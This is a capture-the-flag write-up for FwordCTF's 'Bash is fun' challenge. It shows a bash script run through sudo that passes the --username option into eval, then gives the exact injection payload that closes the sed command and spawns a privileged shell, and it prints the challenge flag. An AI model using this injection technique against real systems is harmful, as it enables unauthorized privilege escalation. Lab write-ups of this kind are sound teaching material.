# Bash is fun
You are provided with an SSH account to server `ssh -p 2222 ctf@funbash.fword.wtf`.

When we get a shell we are in a home directory.
```
$ ls -lha
total 32K
drwxrwxr-t 1 root  user1           4.0K Aug 29 19:29 .
drwxr-xr-x 1 root  root            4.0K Aug 29 19:29 ..
-rw-r--r-- 1 user1 user1            220 May  5  2019 .bash_logout
-rw-r--r-- 1 user1 user1           3.7K May  5  2019 .bashrc
-rw-r--r-- 1 user1 user1            807 May  5  2019 .profile
-rwxr----- 1 root  user-privileged   67 Aug 29 19:08 flag.txt
-rwxr-xr-x 1 root  user-privileged  565 Aug 29 19:08 welcome.sh
-rwxr-xr-x 1 root  root              62 Aug 29 19:08 welcome.txt
```

We are
```
$ id
uid=1000(user1) gid=1000(user1) groups=1000(user1)
```

We can run `sudo -l` to see if we can execute any program with elevated privileges.

```
$ sudo -l
    (user-privileged) NOPASSWD: /home/user1/welcome.sh
```

We can run `welcome.sh` as user `user-privileged`. If we can somehow exploit the script, we can become user`user-privileged` and read the flag in file `flag.txt`.

# `welcome.sh`
```sh
#!/bin/bash
name="greet"
while [[ "$1" =~ ^- && ! "$1" == "--" ]]; do case $1 in
  -V | --version )
    echo "Beta version"
    exit
    ;;
  -n | --name )
    shift; name=$1
    ;;
  -u | --username )
    shift; username=$1
    ;;
  -p | --permission )
     permission=1
     ;;
esac; shift; done
if [[ "$1" == '--' ]]; then shift; fi

echo "Welcome To SysAdmin Welcomer \o/"

eval "function $name { sed 's/user/${username}/g' welcome.txt ; }"
export -f $name
isNew=0
if [[ $isNew -eq 1 ]];then
	$name
fi

if [[ $permission -eq 1 ]];then
	echo "You are: " 
	id
fi
```

## The script
In the beggining there are some operations to read our program options.
The only interesting, and most fun :), line of script is.

```sh
eval "function $name { sed 's/user/${username}/g' welcome.txt ; }"
```

Eval is a builtin command that should never be used with user input or user controllable code, as it can be potentialy used to execute any arbitrary code. This is our way of exploiting the script.

Rest of the script is fairly irrelevant for us.

## Exploit
We can use parameter `--username` to inject any code we want to the eval function which will get executed.

We can start with something easy.

```
$ ./welcome.sh --username "#"
```
and script would execute this command
```sh
eval "function $name { sed 's/user/#/g' welcome.txt ; }"
```

Frankly, this doesn't do much.

Now we can potentially craft a command that would read a file or spawn new shell.
In order to run the script as `user-privileged` we have to use `sudo` with option `--user`.

Exploit
```
$ sudo --user=user-privileged ./welcome.sh -u "pwned/g' welcome.txt;};bash #"
```
and script would execute whis command
```sh
eval "function $name { sed 's/user/pwned/g' welcome.txt;};bash #/g' welcome.txt ; }"
```

We successfuly complete `sed` command and end it with `;`. Then we are free to issue any command we like. We use `bash` so spawn a new shell. This shell would be spawned as user `user-privileged` because the script was running under this user. Finally, at the end, we use `#` to comment out the rest of the eval command (very similar to SQL injectino).

## In action
```
$ sudo --user=user-privileged ./welcome.sh -u "pwned/g' welcome.txt;};bash #"
Welcome To SysAdmin Welcomer \o/
$ id
uid=1001(user-privileged) gid=1001(user-privileged) groups=1001(user-privileged)
```

We become user `user-privileged`. Now we can read our flag.

```
$ cat flag.txt
FwordCTF{W00w_KuR0ko_T0ld_M3_th4t_Th1s_1s_M1sdirecti0n_BasK3t_FTW}
```
## Flag
**FwordCTF{W00w_KuR0ko_T0ld_M3_th4t_Th1s_1s_M1sdirecti0n_BasK3t_FTW}**
